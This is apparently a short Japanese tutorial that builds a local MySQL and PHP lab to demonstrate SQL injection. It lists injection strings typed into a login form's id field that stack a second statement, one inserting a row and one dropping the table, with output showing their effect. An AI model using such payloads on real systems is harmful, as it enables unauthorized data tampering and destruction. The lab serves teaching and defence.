# SQLインジェクション sample
[CSRF](https://qiita.com/bunty/private/61b5a83a40f32f7253a4#sql%E3%82%A4%E3%83%B3%E3%82%B8%E3%82%A7%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3)に関してあれこれ      
とりあえずこれでブラウザで確認しよう  

## これようにdbをつくる

まとめてコピペ

```sql
CREATE DATABASE test;
CREATE USER 'test'@'localhost' IDENTIFIED BY 'test';
grant all on test.* to 'test'@'localhost' identified by 'test';
create table test.login(id int, password varchar(20));
insert into login(id, password) values(1, 'hoge');
```

一応確認

```sql 
mysql> select * from login;
+------+----------+
| id   | password |
+------+----------+
|    1 | hoge     |
+------+----------+
1 row in set (0.00 sec)
```

テスト用のデータを入れる

```sql
mysql> insert into login(id, password) values(1, 'hoge');
```

## [ビルトインウェブサーバー ](http://php.net/manual/ja/features.commandline.webserver.php)を開始させる

```
$ php -S localhost:8080 -t sql-injection
```

## Chromeを開く

```
$ open -na Google\ Chrome
```


## SQLを実行させてみる

idのにこれを入力、パスワードにはhogeを入力するとログインが完了してinsertもされる(上のログインフォームだと大丈夫)

```sql
1; insert into login(id, password) values(2, 'fuga');
```

insertされてるかの確認

```sql
mysql> select * from login;
+------+----------+
| id   | password |
+------+----------+
|    1 | hoge     |
|    2 | fuga     |
+------+----------+
2 rows in set (0.00 sec)

```


同じくidにこれを入力すると画面上は何も起きないが、テーブルが削除される

```sql
5; drop table login;
```

```sql
mysql> select * from login;
ERROR 1146 (42S02): Table 'test.login' doesn't exist
```

## 参考
[SQLインジェクション対策(PHP編)](https://www.websec-room.com/2013/03/04/404)  
[PHPでデータベースに接続するときのまとめ](https://qiita.com/mpyw/items/b00b72c5c95aac573b71#pdoquery-%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89%E3%81%A7%E7%9B%B4%E6%8E%A5%E3%82%AF%E3%82%A8%E3%83%AA%E3%82%92%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B)  
